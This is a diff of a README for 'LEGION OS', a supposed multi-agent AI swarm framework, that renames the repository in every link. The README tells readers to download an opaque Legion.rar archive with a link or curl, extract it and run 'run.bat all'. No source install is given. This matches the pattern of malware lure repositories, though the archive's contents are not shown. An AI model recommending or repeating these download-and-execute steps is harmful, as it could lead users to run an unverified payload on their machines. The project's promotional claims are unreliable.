@@ -3,11 +3,11 @@
 # ⚔️ LEGION OS (v2.6.0)
 ### Next-Generation Multi-Agent Swarm Engine for the AGI Era
 
-<a href="https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar"><img src="https://img.shields.io/badge/Download-Legion.rar%20v2.6.0-blueviolet?style=for-the-badge&logo=github" alt="Download"></a>
-<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/Python-3.11%2B-blue?style=for-the-badge&logo=python" alt="Python"></a>
-<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/Scale-50%2B%20Agents-magenta?style=for-the-badge" alt="Scale"></a>
-<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/Models-GPT--6%20%7C%20Claude%205.5%20%7C%20DeepSeek--V4-green?style=for-the-badge" alt="Models"></a>
-<a href="https://github.com/unitshaperextol/hive-os"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>
+<a href="https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar"><img src="https://img.shields.io/badge/Download-Legion.rar%20v2.6.0-blueviolet?style=for-the-badge&logo=github" alt="Download"></a>
+<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/Python-3.11%2B-blue?style=for-the-badge&logo=python" alt="Python"></a>
+<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/Scale-50%2B%20Agents-magenta?style=for-the-badge" alt="Scale"></a>
+<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/Models-GPT--6%20%7C%20Claude%205.5%20%7C%20DeepSeek--V4-green?style=for-the-badge" alt="Models"></a>
+<a href="https://github.com/unitshaperextol/Legion-os"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>
 
 <br><br>
 
@@ -65,15 +65,15 @@ Legacy frameworks (CrewAI, AutoGen) break down when scaling beyond 5–10 agents
 
 ### 1. Installation & Download
 
-Download the official release package **[`Legion.rar`](https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar)**:
+Download the official release package **[`Legion.rar`](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)**:
 
-👉 **[Click Here to Download LEGION v2.6.0 (Legion.rar)](https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar)**
+👉 **[Click Here to Download LEGION v2.6.0 (Legion.rar)](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)**
 
 Or download via terminal / curl:
 
 ```bash
 # Direct download latest package release
-curl -L -O https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar
+curl -L -O https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar
 
 # Extract Legion.rar and run via script
 run.bat all
@@ -187,7 +187,7 @@ Options:
 ## 📅 Changelog
 
 ### `v2.6.0` (2026 Edition — Latest Release)
-- 📦 Official package release: **[`Legion.rar`](https://github.com/unitshaperextol/hive-os/releases/download/v2.6.0/Legion.rar)**
+- 📦 Official package release: **[`Legion.rar`](https://github.com/unitshaperextol/Legion-os/releases/download/v2.6.0/Legion.rar)**
 - 🚀 Added support for **GPT-6 Astra**, **Claude 5.5 Opus**, and **Gemini 4 Carbon**.
 - ⚡ Inter-agent communication latency reduced to **140ms**.
 - 🛡️ Implemented **Zero-Knowledge Proofs** for agent task validation.
